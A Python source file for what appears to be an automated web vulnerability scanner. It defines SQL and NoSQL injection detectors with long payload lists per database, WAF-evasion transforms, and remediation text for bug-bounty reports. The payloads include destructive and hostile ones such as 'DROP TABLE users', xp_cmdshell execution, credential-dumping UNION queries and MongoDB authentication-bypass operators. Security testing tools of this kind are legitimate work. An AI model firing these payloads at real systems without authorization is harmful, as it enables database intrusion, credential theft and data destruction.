"""
Enhanced SQL Injection Detector with PortSwigger-style bypasses and advanced techniques
"""
import asyncio
import time
import re
from typing import List, Optional, Dict, Any, Tuple
from app.detectors.base import Detector, Endpoint, Finding, ValidationResult, Validator
from app.config import settings


class SQLIDetector(Detector):
    name = "sqli"
    vuln_class = "SQL Injection"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Injection > SQL Injection"

    # PortSwigger-style payloads organized by DBMS and technique
    DBMS_PAYLOADS = {
        "mysql": {
            "error": [
                "'",
                '"',
                "' OR '1'='1",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                "' AND GTID_SUBSET(CONCAT(0x7e, (SELECT @@version)), 1)--",
                "' AND JSON_KEYS((SELECT CONCAT(0x7e, @@version)))--",
                "' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e, @@version)))--",
                "' AND 1=JSON_STORAGE_EXTRACT('{}', '$[0]')--",
                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) t)--",
                "' AND ROW(1,1)=(SELECT*FROM(SELECT 1,COUNT(*),CONCAT(CONCAT(0x7e,(SELECT @@version),0x7e),FLOOR(0x66666666),0x41414141,0x55555555,0x88888888,0x41414141,0x41414141)null FROM INFORMATION_SCHEMA.TABLES GROUP BY null))--",
                "' AND JSON_TABLE('\"x\"', '$[*]' COLUMNS (x VARCHAR(255) PATH '$')) --",
                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t WHERE 1=1)--",
                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t WHERE 1=0)--",
            ],
            "boolean": [
                ("' OR '1'='1", "' AND '1'='2"),
                ("' OR 1=1--", "' AND 1=2--"),
                ("' OR 'a'='a", "' AND 'a'='b"),
                ("') OR ('1'='1", "') AND ('1'='2"),
                ("' OR '1'='1'--", "' AND '1'='2'--"),
                ("' OR '1'='1'/*", "' AND '1'='2'/*"),
                ("' OR '1'='1'#", "' AND '1'='2'#"),
                ("' OR '1'='1';--", "' AND '1'='2';--"),
                ("' OR true--", "' AND false--"),
                ("' OR 1=1-- -", "' AND 1=2-- -"),
                ("' OR '1' LIKE '1", "' AND '1' LIKE '2"),
                ("' OR 1=1#", "' AND 1=2#"),
                ("' OR '1'='1' &'", "' AND '1'='2' &"),
                ("' OR 1=1--+", "' AND 1=2--+"),
                ("' OR !1--", "' AND !1--"),
                ("' OR '1'='1'-- -", "' AND '1'='2'-- -"),
                ("' OR ''='", "' AND ''='"),
                ("' OR 1=1/*", "' AND 1=2/*"),
                ("' OR 1=1 %23", "' AND 1=2 %23"),
            ],
            "time": [
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
                ("'; SELECT SLEEP(5)--", 5),
                ("' AND SLEEP(5)--", 5),
                ("' OR SLEEP(5)--", 5),
                ("' AND (SELECT SLEEP(5) FROM DUAL)--", 5),
                ("' AND BENCHMARK(10000000, MD5(1))--", 5),
                ("' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B)--", 5),
                ("'; WAITFOR DELAY '0:0:5'--", 5),
                ("' AND IF(1=1, SLEEP(5), SLEEP(0))--", 5),
                ("' AND SLEEP(5)#", 5),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #", 5),
                ("' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) t) AND SLEEP(5)--", 5),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*", 5),
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT 1,@@version,3--",
                "' UNION SELECT NULL,NULL-- -",
                "' UNION SELECT 1,2,3,NULL--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--",
            ],
        },
        "postgres": {
            "error": [
                "'",
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' AND 1=CAST((SELECT current_user) AS INT)--",
                "' AND 1=CAST((SELECT current_database()) AS INT)--",
                "' AND 1=(SELECT 1 FROM (SELECT 1) t1, (SELECT 1) t2, (SELECT 1) t3, (SELECT 1) t4)--",
                "' AND 1=(SELECT 1 FROM (SELECT 1) t1, (SELECT 1) t2, (SELECT 1) t3, (SELECT 1) t4, (SELECT 1) t5)--",
                "' AND (SELECT 1 FROM (SELECT 1) t1, (SELECT 1) t2, (SELECT 1) t3, (SELECT 1) t4, (SELECT 1) t5)--",
                "' AND 1=CAST((SELECT inet_client_addr()) AS INT)--",
                "' AND 1=CAST((SELECT current_schema()) AS INT)--",
                "' AND 1=CAST((SELECT session_user) AS INT)--",
            ],
            "boolean": [
                ("' OR '1'='1", "' AND '1'='2"),
                ("' OR 1=1--", "' AND 1=2--"),
                ("' OR 'a'='a", "' AND 'a'='b"),
                ("') OR ('1'='1", "') AND ('1'='2"),
                ("' OR true--", "' AND false--"),
                ("' OR 1=1-- -", "' AND 1=2-- -"),
                ("' OR '1'='1' --", "' AND '1'='2' --"),
                ("' OR 1=1::int=1--", "' AND 1=1::int=0--"),
            ],
            "time": [
                ("'; SELECT pg_sleep(5)--", 5),
                ("' AND pgsleep(5)--", 5),
                ("' OR pg_sleep(5)--", 5),
                ("'; SELECT pg_sleep(5)--", 5),
                ("' AND (SELECT * FROM (SELECT(pg_sleep(5)))ss)--", 5),
                ("' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--", 5),
                ("' AND (SELECT * FROM (SELECT(pg_sleep(5)))ss) AND 1=1--", 5),
                ("'; SELECT pg_sleep(5) WHERE 1=1--", 5),
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT version(),NULL--",
                "' UNION SELECT NULL,version()--",
                "' UNION SELECT current_database(),current_user--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            ],
        },
        "mssql": {
            "error": [
                "'",
                "' AND 1=CAST((SELECT @@version) AS INT)--",
                "' AND 1=CAST((SELECT SYSTEM_USER) AS INT)--",
                "' AND 1=CAST((SELECT DB_NAME()) AS INT)--",
                "' AND 1=CAST((SELECT IS_SRVROLEMEMBER('sysadmin')) AS INT)--",
                "' AND 1=CAST((SELECT SERVERPROPERTY('edition')) AS INT)--",
                "' AND 1=CAST((SELECT SERVERPROPERTY('productlevel')) AS INT)--",
                "' AND 1=(SELECT 1 FROM (SELECT 1 AS A, 1 AS B, 1 AS C, 1 AS D, 1 AS E, 1 AS F, 1 AS G, 1 AS H, 1 AS I, 1 AS J) t GROUP BY t.A,t.B,t.C,t.D,t.E,t.F,t.G,t.H,t.I,t.J)--",
                "' AND EXISTS(SELECT 1 FROM sys.databases)--",
                "' AND (SELECT 1 FROM (SELECT 1 AS A, 1 AS B, 1 AS C, 1 AS D, 1 AS E, 1 AS F, 1 AS G, 1 AS H, 1 AS I, 1 AS J, 1 AS K) t GROUP BY t.A,t.B,t.C,t.D,t.E,t.F,t.G,t.H,t.I,t.J,t.K)--",
            ],
            "boolean": [
                ("' OR '1'='1", "' AND '1'='2"),
                ("' OR 1=1--", "' AND 1=2--"),
                ("' OR 'a'='a", "' AND 'a'='b"),
                ("' OR 1=1-- -", "' AND 1=2-- -"),
                ("' OR true--", "' AND false--"),
                ("' OR 1=1 %23", "' AND 1=2 %23"),
            ],
            "time": [
                ("' WAITFOR DELAY '0:0:5'--", 5),
                ("'; WAITFOR DELAY '0:0:5'--", 5),
                ("' WAITFOR DELAY '0:0:5'--", 5),
                ("'; WAITFOR DELAY '0:0:10'--", 10),
                ("' AND IIF(1=1, WAITFOR DELAY '0:0:5', 0)--", 5),
                ("' AND (SELECT * FROM (SELECT(1) AS a) s) AND WAITFOR DELAY '0:0:5'--", 5),
                ("' AND (SELECT 1 FROM (SELECT 1) t1) AND WAITFOR DELAY '0:0:5'--", 5),
                ("'; IF 1=1 WAITFOR DELAY '0:0:5'--", 5),
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT SYSTEM_USER,DB_NAME(),@@version--",
            ],
        },
        "oracle": {
            "error": [
                "'",
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM sys.v_$version WHERE rownum=1))--",
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
                "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--",
                "' AND (SELECT 1 FROM (SELECT 1 FROM (SELECT 1 FROM dual) a, (SELECT 1 FROM dual) b, (SELECT 1 FROM dual) c, (SELECT 1 FROM dual) d) t)--",
                "' AND 1=(SELECT 1 FROM (SELECT 1 FROM dual) a, (SELECT 1 FROM dual) b, (SELECT 1 FROM dual) c, (SELECT 1 FROM dual) d, (SELECT 1 FROM dual) e)--",
            ],
            "boolean": [
                ("' OR '1'='1", "' AND '1'='2"),
                ("' OR 1=1--", "' AND 1=2--"),
                ("' OR 'a'='a", "' AND 'a'='b"),
                ("' OR true--", "' AND false--"),
                ("' OR 1=1-- -", "' AND 1=2-- -"),
            ],
            "time": [
                ("' AND (SELECT COUNT(*) FROM all_users, all_users)--", 5),
                ("' AND (SELECT COUNT(*) FROM all_tables, all_tables)--", 5),
                ("' AND (SELECT COUNT(*) FROM all_objects, all_objects)--", 5),
                ("' AND (SELECT COUNT(*) FROM dba_users, dba_users)--", 5),
                ("'; EXEC DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
                ("' AND (SELECT COUNT(*) FROM all_sources, all_sources, all_sources)--", 5),
            ],
            "union": [
                "' UNION SELECT NULL FROM DUAL--",
                "' UNION SELECT NULL,NULL FROM DUAL--",
                "' UNION SELECT banner, NULL FROM sys.v_$version--",
                "' UNION SELECT NULL, NULL, NULL FROM DUAL--",
                "' UNION SELECT NULL, NULL, NULL, NULL FROM DUAL--",
                "' UNION SELECT NULL, NULL, NULL, NULL, NULL FROM DUAL--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM DUAL--",
                "' UNION SELECT username,password,NULL FROM dba_users--",
            ],
        },
        "sqlite": {
            "error": [
                "'",
                "' AND 1=CAST((SELECT sqlite_version()) AS INT)--",
                "' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) t)--",
                "' AND CASE WHEN (SELECT COUNT(*) FROM sqlite_master)>0 THEN 1 ELSE 1/0 END--",
                "' AND 1=(SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t)--",
                "' AND (SELECT 1 FROM sqlite_master UNION ALL SELECT 2)--",
            ],
            "boolean": [
                ("' OR '1'='1", "' AND '1'='2"),
                ("' OR 1=1--", "' AND 1=2--"),
                ("' OR 'a'='a", "' AND 'a'='b"),
                ("' OR true--", "' AND false--"),
                ("' OR 1=1-- -", "' AND 1=2-- -"),
                ("' OR 1=1::int=1--", "' AND 1=1::int=0--"),
            ],
            "time": [
                ("' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master)--", 5),
                ("' AND randomblob(100000000)--", 5),
                ("' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)--", 5),
                ("' AND (SELECT * FROM (SELECT 1 UNION SELECT 2) t) AND randomblob(100000000)--", 5),
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT sqlite_version(), NULL--",
                "' UNION SELECT NULL, sqlite_version(), NULL--",
                "' UNION SELECT NULL, NULL, sqlite_version()--",
                "' UNION SELECT NULL, NULL, NULL, NULL--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            ],
        },
    }

    # WAF bypass techniques (PortSwigger-style obfuscation)
    WAF_BYPASSES = [
        lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
        lambda p: p.upper(),
        lambda p: p.replace(' ', '/**/'),
        lambda p: p.replace(' ', '%20'),
        lambda p: p.replace(' ', '%09'),
        lambda p: p.replace(' ', '%0A'),
        lambda p: p.replace(' ', '%0D'),
        lambda p: p.replace('OR', 'O/**/R').replace('AND', 'A/**/ND'),
        lambda p: p.replace('SELECT', 'SEL/**/ECT').replace('UNION', 'UNI/**/ON'),
        lambda p: p.replace('WHERE', 'WH/**/ERE').replace('FROM', 'FR/**/OM'),
        lambda p: p.replace(' ', '%2520'),
        lambda p: p.replace('<', '%253C').replace('>', '%253E'),
        lambda p: p.replace(' ', '%00 '),
        lambda p: p.replace(' ', '/*!*/'),
        lambda p: p.replace(' ', '/*!50000*/'),
        lambda p: p.replace('OR', '(OR)').replace('AND', '(AND)'),
        lambda p: p.replace("'1'='1'", "CONCAT('1','=' '1')").replace("'1'='2'", "CONCAT('1','=' '2')"),
        lambda p: p.replace('SELECT', 'SeLeCt').replace('UNION', 'UnIoN').replace('WHERE', 'WhErE').replace('FROM', 'FrOm').replace('OR', 'Or').replace('AND', 'AnD'),
        lambda p: p.replace('UNION', 'UN/**/ION'),
        lambda p: p.replace('SLEEP', 'SLE/**/EP'),
        lambda p: p.replace('BENCHMARK', 'BENCH/**/MARK'),
    ]

    # Generic payloads for unknown DBMS (expanded production-ready set)
    GENERIC_PAYLOADS = {
        "error": [
            "'",
            '"',
            "')",
            '")',
            "';",
            '";',
            "'--",
            '"--',
            "'#",
            '"#',
            "')--",
            '")--',
            "1' OR '1'='1",
            '1" OR "1"="1',
            "1 OR 1=1--",
            "admin'--",
            "admin'#",
            "admin' OR '1'='1'--",
            "' OR 1=1-- -",
            "') OR ('1'='1' --",
            "1' OR 1=1-- -",
            "' UNION SELECT 1--",
            "'; EXEC xp_cmdshell('dir')--",
            "' OR SLEEP(5)--",
            "1; DROP TABLE users--",
            "' OR ''='",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR 1=1#",
            "1' OR '1'='1' --",
            "' OR 1=1 %23",
            "' OR 1=1%0a--",
            "' OR 1=1%0d--",
            "') OR '1'='1",
            "') OR 1=1--",
            "1'; DROP TABLE users--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "' OR 1=1 LIMIT 1--",
            "admin' AND 1=2--",
            "' OR ''=''",
        ],
        "boolean": [
            ("' OR '1'='1", "' AND '1'='2"),
            ('" OR "1"="1', '" AND "1"="2'),
            ("' OR 1=1--", "' AND 1=2--"),
            ("' OR 'a'='a", "' AND 'a'='b"),
            ("') OR ('1'='1", "') AND ('1'='2"),
            ("' OR true--", "' AND false--"),
            ("1' OR 1=1--", "1' AND 1=2--"),
            ("' OR 1=1-- -", "' AND 1=2-- -"),
            ("' OR '1'='1' --", "' AND '1'='2' --"),
            ("1 OR 1=1--", "1 AND 1=2--"),
            ("admin' AND 1=1--", "admin' AND 1=2--"),
            ("' OR 1=1%23", "' AND 1=2%23"),
        ],
        "time": [
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ("'; SELECT SLEEP(5)--", 5),
            ("'; SELECT pgsleep(5)--", 5),
            ("' WAITFOR DELAY '0:0:5'--", 5),
            ("' AND SLEEP(5)--", 5),
            ("' AND pgsleep(5)--", 5),
            ("' AND (SELECT * FROM (SELECT(pg_sleep(5)))ss)--", 5),
            ("' OR SLEEP(5)--", 5),
            ("' OR pgsleep(5)--", 5),
            ("1 AND (SELECT 123 FROM (WAITFOR(5))", 5),
            ("'; EXEC sp_configure 'show advanced options', 1; WAITFOR DELAY '0:0:5'--", 5),
            ("' AND IF(1=1, SLEEP(5), SLEEP(0))--", 5),
        ],
    }

    def __init__(self, http_client, oob_server=None, playwright_browser=None):
        super().__init__(http_client, oob_server, playwright_browser)
        self.detected_dbms: Optional[str] = None
        self._tested_payloads: set = set()

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        for param in endpoint.params:
            # First, try to fingerprint DBMS
            self.detected_dbms = await self._fingerprint_dbms(endpoint, param)

            # Test error-based
            finding = await self._test_error_based(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test boolean-based
            finding = await self._test_boolean_based(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test time-based
            finding = await self._test_time_based(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test UNION-based
            finding = await self._test_union_based(endpoint, param)
            if finding:
                findings.append(finding)

        return findings

    async def _fingerprint_dbms(self, endpoint: Endpoint, param: str) -> Optional[str]:
        """Attempt to identify the DBMS"""
        test_payloads = {
            "mysql": "' AND (SELECT @@version)--",
            "postgres": "' AND (SELECT version())--",
            "mssql": "' AND (SELECT @@version)--",
            "oracle": "' AND (SELECT banner FROM sys.v_$version WHERE rownum=1)--",
            "sqlite": "' AND (SELECT sqlite_version())--",
        }

        for dbms, payload in test_payloads.items():
            test_url = endpoint.with_param(param, payload)
            resp = await self._fetch(test_url)
            if resp and self._has_sql_error(resp["body"]):
                return dbms
        return None

    def _get_payloads(self, technique: str) -> List:
        """Get payloads for current DBMS or generic"""
        if self.detected_dbms and self.detected_dbms in self.DBMS_PAYLOADS:
            return self.DBMS_PAYLOADS[self.detected_dbms].get(technique, [])
        return self.GENERIC_PAYLOADS.get(technique, [])

    async def _test_error_based(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        control = await self._fetch(endpoint.url)
        if not control:
            return None

        payloads = self._get_payloads("error") + self.GENERIC_PAYLOADS["error"]

        for payload in payloads:
            if payload in self._tested_payloads:
                continue
            self._tested_payloads.add(payload)

            test_url = endpoint.with_param(param, payload)
            test = await self._fetch(test_url)
            if not test:
                continue

            if self._has_sql_error(test["body"]):
                return self._make_finding(
                    endpoint=endpoint,
                    param=param,
                    confidence="confirmed",
                    evidence={
                        "payload": payload,
                        "type": "error_based",
                        "dbms": self.detected_dbms or "unknown",
                        "request_url": test_url,
                        "response_status": test["status"],
                        "response_body_snippet": test["body"][:500],
                        "control_body_snippet": control["body"][:500],
                    },
                    summary=f"Error-based SQL Injection in parameter '{param}' ({self.detected_dbms or 'unknown'} DBMS)",
                    description=(
                        f"The parameter '{param}' is vulnerable to error-based SQL injection. "
                        f"Injecting a single quote causes a database error to be reflected in the response, "
                        f"confirming unsanitized input concatenation into SQL queries. "
                        f"Detected DBMS: {self.detected_dbms or 'unknown'}."
                    ),
                    steps_to_reproduce=(
                        f"1. Navigate to: {test_url}\n"
                        f"2. Observe database error message in response"
                    ),
                    impact=(
                        "Error-based SQLi can leak database structure, enable data extraction, "
                        "and potentially lead to full database compromise."
                    ),
                    remediation=(
                        "Use parameterized queries (prepared statements) exclusively. "
                        "Never concatenate user input into SQL strings. "
                        "Implement input validation and a WAF as defense-in-depth."
                    ),
                )

        # Try WAF bypasses
        for base_payload in payloads[:5]:
            for bypass in self.WAF_BYPASSES:
                try:
                    variant = bypass(base_payload)
                    if variant not in self._tested_payloads:
                        self._tested_payloads.add(variant)
                        test_url = endpoint.with_param(param, variant)
                        test = await self._fetch(test_url)
                        if test and self._has_sql_error(test["body"]):
                            return self._make_finding(
                                endpoint=endpoint,
                                param=param,
                                confidence="confirmed",
                                evidence={
                                    "payload": variant,
                                    "original_payload": base_payload,
                                    "type": "error_based_waf_bypass",
                                    "dbms": self.detected_dbms or "unknown",
                                    "request_url": test_url,
                                },
                                summary=f"Error-based SQL Injection with WAF bypass in parameter '{param}'",
                                description=(
                                    f"The parameter '{param}' is vulnerable to error-based SQL injection. "
                                    f"A WAF bypass technique ({variant[:50]}...) was required to trigger the error."
                                ),
                                steps_to_reproduce=(
                                    f"1. Send bypass payload: {variant[:100]}\n"
                                    f"2. Observe database error message in response"
                                ),
                                impact="WAF bypass allows SQLi exploitation despite protection.",
                                remediation="Use parameterized queries. WAFs can be bypassed; they are not a substitute for secure coding.",
                            )
                except Exception:
                    pass
        return None

    def _has_sql_error(self, body: str) -> bool:
        error_patterns = [
            # MySQL
            "sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_result",
            "mysql_query", "mysql_error", "mysql_errno", "mysql_affected_rows",
            "mysqli_", "pdo_mysql", "sqlstate",
            # PostgreSQL
            "postgresql", "pg_query", "pg_exec", "pg_fetch", "pg_num_rows",
            "pqexec", "pqresult", "pqerror", "postgres",
            # MSSQL
            "microsoft ole db provider", "odbc drivers", "jdbc driver",
            "sql server", "oledb", "sqloledb", "sqlncli",
            "unclosed quotation mark", "incorrect syntax near",
            # Oracle
            "ora-01756", "ora-00933", "ora-00900", "ora-00904",
            "ora-00907", "ora-00911", "ora-00917", "ora-00923",
            "ora-00936", "ora-00942", "ora-01476", "ora-01722",
            "oracle error", "oracle driver", "oracle.jdbc",
            # SQLite
            "sqlite3.operationalerror", "sqlite3.databaseerror",
            "sqlite_master", "sqlite_sequence", "sqlite_stat",
            # Generic
            "syntax error", "quoted string not properly terminated",
            "unterminated quoted string", "unterminated string",
            "unexpected end of SQL command", "unterminated comment",
            "division by zero", "data type mismatch",
        ]
        body_lower = body.lower()
        return any(pattern in body_lower for pattern in error_patterns)

    async def _test_boolean_based(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        control = await self._fetch(endpoint.url)
        if not control:
            return None

        # Get boolean payloads for current DBMS
        boolean_pairs = self._get_payloads("boolean") + self.GENERIC_PAYLOADS["boolean"]

        for true_payload, false_payload in boolean_pairs:
            true_url = endpoint.with_param(param, true_payload)
            false_url = endpoint.with_param(param, false_payload)

            true_resp = await self._fetch(true_url)
            false_resp = await self._fetch(false_url)

            if not true_resp or not false_resp:
                continue

            validation = Validator.boolean_based_sqli(
                {"body": control["body"]},
                {"body": true_resp["body"]},
                {"body": false_resp["body"]}
            )

            if validation.confirmed:
                return self._make_finding(
                    endpoint=endpoint,
                    param=param,
                    confidence="confirmed",
                    evidence={
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "type": "boolean_based",
                        "dbms": self.detected_dbms or "unknown",
                        "request_url": true_url,
                        "validation": validation.evidence,
                    },
                    summary=f"Boolean-based SQL Injection in parameter '{param}' ({self.detected_dbms or 'unknown'} DBMS)",
                    description=(
                        f"The parameter '{param}' is vulnerable to boolean-based blind SQL injection. "
                        f"The application responds differently to true vs false conditions, "
                        f"allowing an attacker to extract data bit by bit."
                    ),
                    steps_to_reproduce=(
                        f"1. Send true condition: {true_url}\n"
                        f"2. Send false condition: {false_url}\n"
                        f"3. Observe different response lengths/content"
                    ),
                    impact="Boolean-based blind SQLi allows full database enumeration and data extraction.",
                    remediation="Use parameterized queries. Implement input validation. Limit database error verbosity.",
                )

        return None

    async def _test_time_based(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        control_start = time.time()
        control = await self._fetch(endpoint.url)
        control_time = time.time() - control_start
        if not control:
            return None

        time_payloads = self._get_payloads("time") + self.GENERIC_PAYLOADS["time"]

        for payload, expected_delay in time_payloads:
            test_url = endpoint.with_param(param, payload)
            test_start = time.time()
            test = await self._fetch(test_url)
            test_time = time.time() - test_start

            if not test:
                continue

            validation = Validator.timing_based_sqli(control_time, test_time, expected_delay * 0.8)
            if validation.confirmed:
                return self._make_finding(
                    endpoint=endpoint,
                    param=param,
                    confidence="confirmed",
                    evidence={
                        "payload": payload,
                        "type": "time_based",
                        "expected_delay": expected_delay,
                        "actual_delay": test_time - control_time,
                        "dbms": self.detected_dbms or "unknown",
                        "request_url": test_url,
                        "validation": validation.evidence,
                    },
                    summary=f"Time-based SQL Injection in parameter '{param}' ({self.detected_dbms or 'unknown'} DBMS)",
                    description=(
                        f"The parameter '{param}' is vulnerable to time-based blind SQL injection. "
                        f"Injecting a sleep payload causes a measurable delay in the response, "
                        f"confirming the database executes injected SQL."
                    ),
                    steps_to_reproduce=(
                        f"1. Send payload causing {expected_delay}s delay: {test_url}\n"
                        f"2. Measure response time vs normal request"
                    ),
                    impact="Time-based blind SQLi allows data extraction even without visible output.",
                    remediation="Use parameterized queries. Set query timeouts. Monitor for anomalous query durations.",
                )

        return None

    async def _test_union_based(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        """Test UNION-based SQL injection by determining column count"""
        union_payloads = self._get_payloads("union")

        # First determine number of columns
        for i in range(1, 16):
            payload = "' UNION SELECT " + ",".join(["NULL"] * i) + "--"
            test_url = endpoint.with_param(param, payload)
            test = await self._fetch(test_url)

            if test and test["status"] == 200:
                # Found column count, now test data extraction
                return self._make_finding(
                    endpoint=endpoint,
                    param=param,
                    confidence="confirmed",
                    evidence={
                        "payload": payload,
                        "type": "union_based",
                        "column_count": i,
                        "dbms": self.detected_dbms or "unknown",
                        "request_url": test_url,
                    },
                    summary=f"UNION-based SQL Injection in parameter '{param}' ({i} columns)",
                    description=(
                        f"The parameter '{param}' is vulnerable to UNION-based SQL injection. "
                        f"The query has {i} columns, allowing data extraction from other tables."
                    ),
                    steps_to_reproduce=(
                        f"1. Determine column count: {test_url}\n"
                        f"2. Extract data: ' UNION SELECT user,password,NULL FROM users--"
                    ),
                    impact="UNION-based SQLi allows direct data extraction from database tables.",
                    remediation="Use parameterized queries. Limit database permissions. Use WAF as defense-in-depth.",
                )

        return None

    async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.get(url, timeout=settings.REQUEST_TIMEOUT)
            return {
                "status": resp.status_code,
                "headers": dict(resp.headers),
                "body": resp.text,
            }
        except Exception:
            return None


class NoSQLIDetector(Detector):
    name = "nosqli"
    vuln_class = "NoSQL Injection"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Injection > NoSQL Injection"

    # Extended NoSQL injection payloads
    PAYLOADS = [
        # Operator injection
        {"$ne": None},
        {"$gt": ""},
        {"$gte": ""},
        {"$lt": ""},
        {"$lte": ""},
        {"$regex": ".*"},
        {"$where": "function() { return true; }"},
        {"$exists": True},
        {"$nin": []},
        {"$in": ["admin", "administrator", "root", "test"]},
        {"$or": [{"username": "admin"}, {"username": "administrator"}]},
        {"$nor": [{"username": "admin"}]},
        {"$not": {"$eq": "admin"}},
        # Type confusion
        {"$type": 2},
        {"$size": 1},
        {"$mod": [2, 0]},
        # Array operators
        {"$all": ["admin"]},
        {"$elemMatch": {"username": "admin"}},
        # JavaScript injection
        {"$where": "this.username == 'admin' || this.password == 'password'"},
        {"$where": "sleep(5000) || true"},
    ]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("POST", "PUT", "PATCH")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        for param in endpoint.params:
            for payload in self.PAYLOADS:
                finding = await self._test_payload(endpoint, param, payload)
                if finding:
                    findings.append(finding)
                    break

        return findings

    async def _test_payload(self, endpoint: Endpoint, param: str, payload: Dict) -> Optional[Finding]:
        import json
        control = await self._fetch_json(endpoint.url)
        if not control:
            return None

        test_data = {p: endpoint.get_param_value(p) or "test" for p in endpoint.params}
        test_data[param] = payload

        test = await self._post_json(endpoint.url, test_data)
        if not test:
            return None

        # Check for response differences
        if len(test["body"]) != len(control["body"]) or test["status"] != control["status"]:
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="confirmed",
                evidence={
                    "payload": payload,
                    "type": "operator_injection",
                    "request_body": json.dumps(test_data),
                    "response_status": test["status"],
                    "response_body_snippet": test["body"][:500],
                },
                summary=f"NoSQL Injection in parameter '{param}' via operator injection",
                description=(
                    f"The parameter '{param}' accepts MongoDB query operators without validation. "
                    f"An attacker can inject operators like $ne, $gt, $where to manipulate queries."
                ),
                steps_to_reproduce=(
                    f"1. Send JSON payload with operator: {json.dumps(payload)}\n"
                    f"2. Observe different response vs normal query"
                ),
                impact="NoSQL injection can bypass authentication, extract data, or modify database records.",
                remediation="Validate and sanitize all input. Use schema validation. Disable $where if not needed. Use parameterized queries.",
            )
        return None

    async def _fetch_json(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.get(url, timeout=settings.REQUEST_TIMEOUT)
            return {"status": resp.status_code, "body": resp.text}
        except Exception:
            return None

    async def _post_json(self, url: str, data: Dict) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.post(url, json=data, timeout=settings.REQUEST_TIMEOUT)
            return {"status": resp.status_code, "body": resp.text}
        except Exception:
            return None


class CommandInjectionDetector(Detector):
    name = "command_injection"
